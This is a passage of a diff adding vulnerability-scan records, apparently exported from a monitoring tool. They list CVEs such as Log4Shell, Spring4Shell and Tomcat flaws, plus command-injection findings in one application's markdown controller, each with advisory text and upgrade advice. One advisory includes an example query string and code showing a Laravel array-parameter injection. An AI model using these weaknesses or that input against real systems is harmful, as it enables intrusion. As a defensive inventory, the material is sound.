+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-258285CB5C64540D",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10493093312946880765",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-1356",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2024-37890"
+      ],
+      "vulnerability.remediation.description": "Upgrade `ws` to version 5.2.4, 6.2.3, 7.5.10, 8.17.1 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[ws](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when the number of received headers exceed the `server.maxHeadersCount` or `request.maxHeadersCount` threshold.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-B95A6F4794F9C0EE",
+      "affected_entity.vulnerable_component.name": "ws:8.7.0",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "10800584332478334489",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-2152",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.7,
+      "vulnerability.references.cve": [
+        "CVE-2025-55752"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.109, 10.1.45, 11.0.11 or higher.",
+      "vulnerability.title": "Relative Path Traversal",
+      "vulnerability.type": "Relative Path Traversal",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Relative Path Traversal via the URL normalization. An attacker can bypass security constraints and access restricted directories such as `/WEB-INF/` and `/META-INF/` by manipulating the request URI. If PUT requests are also enabled then malicious files could be uploaded leading to remote code execution.\r\n\r\n**Note:**\r\n\r\n1) Older, EOL versions may also be affected.\r\n2) PUT requests are normally limited to trusted users and it is considered unlikely that PUT requests would be enabled in conjunction with a rewrite that manipulated the URI.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-23"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "1082200756201028688",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-2132",
+      "vulnerability.stack": "CODE",
+      "vulnerability.davis_assessment.level": "CRITICAL",
+      "vulnerability.davis_assessment.score": 10,
+      "vulnerability.cvss.base_score": null,
+      "vulnerability.references.cve": [],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "Command injection at BioController.markdownToHtml():96",
+      "vulnerability.type": "Command injection",
+      "vulnerability.description": "A command injection vulnerability allows an attacker to execute existing system commands on a host operating system arbitrarily.\n\nThis is usually via an application's failure to validate user-supplied input (request parameters, headers, etc.). By allowing this unsanitized data to reach a system shell, commands can be executed using the privileges of the vulnerable application itself. An attacker might then read, modify or delete sensitive files, or download and execute malicious software.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": null,
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 10,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "11497873967941161718",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-555",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 8.8,
+      "vulnerability.cvss.base_score": 10,
+      "vulnerability.references.cve": [
+        "CVE-2021-44228"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.logging.log4j:log4j-core` to version 2.3.1, 2.12.2, 2.15.0 or higher.\n\n\n",
+      "vulnerability.title": "Remote Code Execution (RCE)",
+      "vulnerability.type": "Code Injection",
+      "vulnerability.description": "[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE).\nApache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.\r\n\r\nFrom log4j 2.15.0, JNDI LDAP endpoints are restricted to localhost by default.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.logging.log4j:log4j-core:2.4",
+      "vulnerability.references.cwe": [
+        "CWE-94"
+      ],
+      "vulnerability.parent.davis_assessment.score": 8.8,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "11632707227567822810",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-954",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2023-44487"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 8.5.94, 9.0.81, 10.1.14, 11.0.0-M12 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) in the implementation of the HTTP/2 protocol. An attacker can cause a denial of service (including via DDoS) by rapidly resetting many streams through request cancellation.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.29",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "11632707227567822810",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-954",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2023-44487"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 8.5.94, 9.0.81, 10.1.14, 11.0.0-M12 or higher.",
+      "vulnerability.title": "Denial of Service (DoS)",
+      "vulnerability.type": "Uncontrolled Resource Consumption",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) in the implementation of the HTTP/2 protocol. An attacker can cause a denial of service (including via DDoS) by rapidly resetting many streams through request cancellation.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-400"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "11652867437684917580",
+      "affected_entity.id": "PROCESS_GROUP-4BF208BC328887D0",
+      "vulnerability.display_id": "S-1852",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.3,
+      "vulnerability.cvss.base_score": 7.3,
+      "vulnerability.references.cve": [
+        "CVE-2023-26159"
+      ],
+      "vulnerability.remediation.description": "Upgrade `follow-redirects` to version 1.15.4 or higher.",
+      "vulnerability.title": "Improper Handling of Extra Parameters",
+      "vulnerability.type": "Improper Handling of Extra Parameters",
+      "vulnerability.description": "Affected versions of this package are vulnerable to Improper Handling of Extra Parameters due to the improper handling of URLs by the `url.parse()` function. When `new URL()` throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-1B9FD05898DC0602",
+      "affected_entity.vulnerable_component.name": "follow-redirects:1.14.1",
+      "vulnerability.references.cwe": [
+        "CWE-235"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.3,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "11940508123090939512",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-2153",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2025-49124"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.106, 10.1.42, 11.0.8 or higher.",
+      "vulnerability.title": "Untrusted Search Path",
+      "vulnerability.type": "Untrusted Search Path",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Untrusted Search Path via the `icacls.exe` call during Windows installation, when a full path is not specified. An attacker can execute arbitrary code with elevated privileges by placing a malicious executable in a directory that is searched before the intended system directory.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-426"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "12310102962971054367",
+      "affected_entity.id": "PROCESS_GROUP-DDAFDFB12541C926",
+      "vulnerability.display_id": "S-1176",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 8.8,
+      "vulnerability.cvss.base_score": 9.8,
+      "vulnerability.references.cve": [
+        "CVE-2024-21508"
+      ],
+      "vulnerability.remediation.description": "Upgrade `mysql2` to version 3.9.4 or higher.",
+      "vulnerability.title": "Remote Code Execution (RCE)",
+      "vulnerability.type": "Code Injection",
+      "vulnerability.description": "[mysql2](https://www.npmjs.com/package/mysql2) is a mostly API compatible with mysqljs and supports majority of features.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) via the `readCodeFor` function due to improper validation of the `supportBigNumbers` and `bigNumberStrings` values.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-299FF2EDD49BEE36",
+      "affected_entity.vulnerable_component.name": "mysql2:2.3.3",
+      "vulnerability.references.cwe": [
+        "CWE-94"
+      ],
+      "vulnerability.parent.davis_assessment.score": 8.8,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "12377949506802659192",
+      "affected_entity.id": "PROCESS_GROUP-3D9C18B591C03D4E",
+      "vulnerability.display_id": "S-1148",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.6,
+      "vulnerability.cvss.base_score": 8.6,
+      "vulnerability.references.cve": [],
+      "vulnerability.remediation.description": "Upgrade `laravel/framework` to version 6.20.11, 7.30.2, 8.22.1 or higher.",
+      "vulnerability.title": "SQL Injection",
+      "vulnerability.type": "SQL Injection",
+      "vulnerability.description": "[laravel/framework](https://packagist.org/packages/laravel/framework) is a PHP framework for web artisans.\n\nAffected versions of this package are vulnerable to SQL Injection. Laravel database query builder as part of its where and similar methods accepts two parameters - name of a column and a value which provided column should contain. Issue comes from the value parameter which accepts an array as possible input. When an array is added - laravel query builder takes all items from it and uses them in a given order as database binding parameters. Finally, when constructed query is executed it takes all provided binding parameters as is which leads to a possibility where items from an array value will be used as values for other parts of the query thus leaking of unintended data.\r\n\r\nExample of a problematic query:\r\n```\r\n// HTTP Request Query: https://laravel.com/users?id[]=1&id[]=1\r\n$id = Request::input('id');\r\nUser::where('id', $id)->where('is_admin', 0)->first();\r\n// This could lead to a query where \"is_admin\" column is set to 1.\r\n```",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-120D8F6A0151381F",
+      "affected_entity.vulnerable_component.name": "laravel/framework:v8.22.0",
+      "vulnerability.references.cwe": [
+        "CWE-89"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.6,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "12391078814616479342",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-2130",
+      "vulnerability.stack": "CODE",
+      "vulnerability.davis_assessment.level": "CRITICAL",
+      "vulnerability.davis_assessment.score": 10,
+      "vulnerability.cvss.base_score": null,
+      "vulnerability.references.cve": [],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "Command injection at BioController.markdownToHtml():90",
+      "vulnerability.type": "Command injection",
+      "vulnerability.description": "A command injection vulnerability allows an attacker to execute existing system commands on a host operating system arbitrarily.\n\nThis is usually via an application's failure to validate user-supplied input (request parameters, headers, etc.). By allowing this unsanitized data to reach a system shell, commands can be executed using the privileges of the vulnerable application itself. An attacker might then read, modify or delete sensitive files, or download and execute malicious software.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": null,
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 10,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "1250006170806077669",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-2135",
+      "vulnerability.stack": "CODE",
+      "vulnerability.davis_assessment.level": "CRITICAL",
+      "vulnerability.davis_assessment.score": 10,
+      "vulnerability.cvss.base_score": null,
+      "vulnerability.references.cve": [],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "Command injection at BioController.markdownToHtml():89",
+      "vulnerability.type": "Command injection",
+      "vulnerability.description": "A command injection vulnerability allows an attacker to execute existing system commands on a host operating system arbitrarily.\n\nThis is usually via an application's failure to validate user-supplied input (request parameters, headers, etc.). By allowing this unsanitized data to reach a system shell, commands can be executed using the privileges of the vulnerable application itself. An attacker might then read, modify or delete sensitive files, or download and execute malicious software.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": null,
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 10,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "12712768967694685725",
+      "affected_entity.id": "PROCESS_GROUP-DDAFDFB12541C926",
+      "vulnerability.display_id": "S-1355",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.2,
+      "vulnerability.references.cve": [
+        "CVE-2024-21512"
+      ],
+      "vulnerability.remediation.description": "Upgrade `mysql2` to version 3.9.8 or higher.",
+      "vulnerability.title": "Prototype Pollution",
+      "vulnerability.type": "Prototype Pollution",
+      "vulnerability.description": "[mysql2](https://www.npmjs.com/package/mysql2) is a mostly API compatible with mysqljs and supports majority of features.\n\nAffected versions of this package are vulnerable to Prototype Pollution due to improper user input sanitization passed to fields and tables when using `nestTables`.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-299FF2EDD49BEE36",
+      "affected_entity.vulnerable_component.name": "mysql2:2.3.3",
+      "vulnerability.references.cwe": [
+        "CWE-1321"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "12728090386958545476",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-2082",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2025-52520"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.107, 10.1.43, 11.0.9 or higher.",
+      "vulnerability.title": "Integer Overflow or Wraparound",
+      "vulnerability.type": "Integer Overflow or Wraparound",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Integer Overflow or Wraparound via file uploads through servlet containers. An attacker can craft malicious multipart/form-data requests with specially crafted Content-Length headers that trigger integer overflow vulnerabilities, potentially bypassing file size restrictions and causing memory exhaustion.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.29",
+      "vulnerability.references.cwe": [
+        "CWE-190"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "12728090386958545476",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-2082",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2025-52520"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.107, 10.1.43, 11.0.9 or higher.",
+      "vulnerability.title": "Integer Overflow or Wraparound",
+      "vulnerability.type": "Integer Overflow or Wraparound",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Integer Overflow or Wraparound via file uploads through servlet containers. An attacker can craft malicious multipart/form-data requests with specially crafted Content-Length headers that trigger integer overflow vulnerabilities, potentially bypassing file size restrictions and causing memory exhaustion.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-190"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "12733610332423956486",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-2113",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2025-48989"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.108, 10.1.44, 11.0.10 or higher.",
+      "vulnerability.title": "Improper Resource Shutdown or Release",
+      "vulnerability.type": "Improper Resource Shutdown or Release",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Improper Resource Shutdown or Release via the HTTP/2 Handler. An attacker can cause a denial of service by sending specially crafted requests that exploit improper handling of resource shutdown.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.29",
+      "vulnerability.references.cwe": [
+        "CWE-404"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "12733610332423956486",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-2113",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2025-48989"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.108, 10.1.44, 11.0.10 or higher.",
+      "vulnerability.title": "Improper Resource Shutdown or Release",
+      "vulnerability.type": "Improper Resource Shutdown or Release",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Improper Resource Shutdown or Release via the HTTP/2 Handler. An attacker can cause a denial of service by sending specially crafted requests that exploit improper handling of resource shutdown.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-404"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "13080692565938470532",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-826",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.6,
+      "vulnerability.cvss.base_score": 9.8,
+      "vulnerability.references.cve": [
+        "CVE-2017-5645"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.logging.log4j:log4j-core` to version 2.8.2 or higher.",
+      "vulnerability.title": "Deserialization of Untrusted Data",
+      "vulnerability.type": "Deserialization of Untrusted Data",
+      "vulnerability.description": "[org.apache.logging.log4j:log4j-core](http://logging.apache.org/log4j/1.2/) is a logging library for Java.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. When using the TCP socket server or UDP socket server to receive serialized log events from another application, a specially crafted binary payload can be sent that, when deserialized, can execute arbitrary code.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.logging.log4j:log4j-core:2.4",
+      "vulnerability.references.cwe": [
+        "CWE-502"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.6,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "1340823583484240022",
+      "affected_entity.id": "PROCESS_GROUP-04A6A231EA968941",
+      "vulnerability.display_id": "S-600",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.6,
+      "vulnerability.cvss.base_score": 9.8,
+      "vulnerability.references.cve": [
+        "CVE-2022-22965"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.springframework:spring-beans` to version 5.2.20, 5.3.18 or higher.",
+      "vulnerability.title": "Remote Code Execution (RCE)",
+      "vulnerability.type": "Code Injection",
+      "vulnerability.description": "[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).\r\n\r\n**Note:** \r\n* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara, or Glassfish. \r\n\r\n* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. \r\n\r\n* As such, while we recommend users prioritize first remediating against the configuration described above, for full protection, we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.\r\n\r\n### Update Log \r\n* **31/03/2022 -** Severity was raised from 8.1 to 9.8\r\n* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish).",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-AA93451F939FDE00",
+      "affected_entity.vulnerable_component.name": "org.springframework:spring-beans:5.1.9.RELEASE",
+      "vulnerability.references.cwe": [
+        "CWE-94"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.6,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "1340823583484240022",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-600",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.6,
+      "vulnerability.cvss.base_score": 9.8,
+      "vulnerability.references.cve": [
+        "CVE-2022-22965"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.springframework:spring-beans` to version 5.2.20, 5.3.18 or higher.",
+      "vulnerability.title": "Remote Code Execution (RCE)",
+      "vulnerability.type": "Code Injection",
+      "vulnerability.description": "[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).\r\n\r\n**Note:** \r\n* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara, or Glassfish. \r\n\r\n* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. \r\n\r\n* As such, while we recommend users prioritize first remediating against the configuration described above, for full protection, we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.\r\n\r\n### Update Log \r\n* **31/03/2022 -** Severity was raised from 8.1 to 9.8\r\n* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish).",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.springframework:spring-beans:5.2.2.RELEASE",
+      "vulnerability.references.cwe": [
+        "CWE-94"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.6,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "13434076902554658846",
